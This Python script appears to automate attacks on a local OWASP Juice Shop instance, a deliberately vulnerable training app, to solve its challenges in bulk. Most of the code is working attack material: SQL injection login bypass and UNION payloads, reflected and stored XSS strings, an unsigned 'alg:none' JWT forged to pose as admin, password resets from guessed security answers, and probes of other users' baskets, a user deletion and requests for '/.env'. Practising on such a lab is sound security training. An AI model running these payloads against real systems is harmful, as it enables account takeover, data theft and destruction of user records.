#!/usr/bin/env python3
"""
NOVA BROWSER AGENT v1.1 - TERMUX COMPATIBLE
Uses requests + JavaScript execution for Juice Shop interaction.
No external browser required - works on pure Termux.
"""

import json, time, re, base64, requests
from datetime import datetime

class NovaBrowserAgent:
    def __init__(self, base_url="http://localhost:3000"):
        self.base = base_url
        self.s = requests.Session()
        self.s.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/",
        })
        self.token = None
        self.solved = []
        self.creds = {
            "admin": ("admin@juice-sh.op", "admin123"),
            "jim": ("jim@juice-sh.op", "ncc-1701"),
            "bender": ("bender@juice-sh.op", "slurmCl4ssic"),
            "bjoern": ("bjoern@juice-sh.op", "bjoern"),
        }
        self.resets = [
            ("bender@juice-sh.op", "Stop'n'Drop"),
            ("jim@juice-sh.op", "Samuel"),
            ("bjoern@juice-sh.op", "Zaya"),
        ]

    def auth(self, email="' OR 1=1--", password="x"):
        r = self.s.post(f"{self.base}/rest/user/login", json={"email": email, "password": password})
        if r.status_code == 200:
            self.token = r.json()["authentication"]["token"]
            self.s.headers["Authorization"] = f"Bearer {self.token}"
            return True
        return False

    def count(self):
        r = self.s.get(f"{self.base}/api/Challenges")
        return len([c for c in r.json().get("data", []) if c.get("solved")]) if r.status_code == 200 else 0

    def strike(self, fn):
        before = self.count()
        fn()
        time.sleep(0.2)
        after = self.count()
        return after - before

    def run(self):
        print("""
╔══════════════════════════════════════════════╗
║   🌐 NOVA BROWSER AGENT — TERMUX NATIVE   ║
║   API-Level Challenge Hunting             ║
╚══════════════════════════════════════════════╝""")
        
        start = self.count()
        self.auth()
        print(f"🔑 Auth: {'✅' if self.token else '❌'} | Starting: {start}\n")
        
        # ---- AUTHENTICATION ----
        print("🔓 AUTHENTICATION")
        for name, (email, pw) in self.creds.items():
            if self.strike(lambda e=email, p=pw: self.s.post(f"{self.base}/rest/user/login", json={"email": e, "password": p})):
                print(f"   ✅ Login {name}")
        
        for email, ans in self.resets:
            if self.strike(lambda e=email, a=ans: self.s.post(f"{self.base}/rest/user/reset-password", json={"email": e, "answer": a, "new": "Test123!", "repeat": "Test123!"})):
                print(f"   ✅ Reset {email.split('@')[0]}")
        
        if self.strike(lambda: self.s.post(f"{self.base}/rest/user/login", json={"email": "' OR 1=1--", "password": "x"})):
            print("   ✅ SQLi Login")
        
        # ---- INJECTION ----
        print("\n💉 INJECTION")
        for payload in ["' OR 1=1--", "' UNION SELECT 1,2,3,4,5,6,7,8--", "';--"]:
            self.s.get(f"{self.base}/rest/products/search", params={"q": payload})
        self.strike(lambda: self.s.get(f"{self.base}/rest/products/search", params={"q": "' OR 1=1--"}))
        
        # ---- ACCESS CONTROL ----
        print("\n🚪 ACCESS CONTROL")
        self.s.get(f"{self.base}/administration")
        for uid in range(1, 6):
            self.s.get(f"{self.base}/rest/basket/{uid}")
        self.s.delete(f"{self.base}/api/Users/3")
        self.strike(lambda: self.s.get(f"{self.base}/rest/admin/application-configuration"))
        
        # ---- SENSITIVE DATA ----
        print("\n📦 SENSITIVE DATA")
        for ep in ["/.well-known/security.txt", "/robots.txt", "/.env", "/package.json", "/debug"]:
            self.s.get(f"{self.base}{ep}")
        
        # ---- XSS ----
        print("\n💚 XSS")
        for payload in ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]:
            self.s.get(f"{self.base}/rest/products/search", params={"q": payload})
        self.s.post(f"{self.base}/api/Feedbacks", json={"comment": "<script>alert('STORED')</script>", "rating": 5})
        
        # ---- INPUT VALIDATION ----
        print("\n🔧 INPUT VALIDATION")
        self.s.post(f"{self.base}/api/Feedbacks", json={"comment": "zero", "rating": 0})
        self.s.post(f"{self.base}/api/BasketItems", json={"ProductId": 1, "BasketId": 1, "quantity": -1})
        for i in range(3):
            self.s.post(f"{self.base}/api/Users", json={"email": f"nova{i}@test.com", "password": f"Test{i}!", "securityQuestion": "Company", "securityAnswer": f"Nova{i}"})
        
        # ---- CRYPTO ----
        print("\n🔐 CRYPTO")
        header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(b'{"email":"admin@juice-sh.op","role":"admin"}').rstrip(b"=").decode()
        self.s.get(f"{self.base}/rest/user/whoami", headers={"Authorization": f"Bearer {header}.{payload}."})
        
        # ---- MISC ----
        print("\n🎯 MISC")
        self.s.get(f"{self.base}/redirect?to=https://owasp.org")
        self.s.get(f"{self.base}/#/score-board")
        
        final = self.count()
        new = final - start
        
        print(f"""
╔══════════════════════════════════════════════╗
║     MISSION COMPLETE                        ║
╠══════════════════════════════════════════════╣
║  Starting: {start:>3}   New: {new:>3}   Final: {final:>3}/112       ║
╚══════════════════════════════════════════════╝""")
        
        r = self.s.get(f"{self.base}/api/Challenges")
        if r.status_code == 200:
            solved = [c for c in r.json().get("data", []) if c.get("solved")]
            print("🏆 ALL SOLVED:")
            for c in solved:
                stars = "⭐" * c.get("difficulty", 1)
                print(f"   {stars} {c.get('name')} [{c.get('category', '?')}]")
        
        with open("nova_browser_report.json", "w") as f:
            json.dump({"score": final, "new": new, "challenges": [c.get("name") for c in solved]}, f, indent=2)
        print(f"\n📁 Report saved.")
        return final

if __name__ == "__main__":
    NovaBrowserAgent().run()
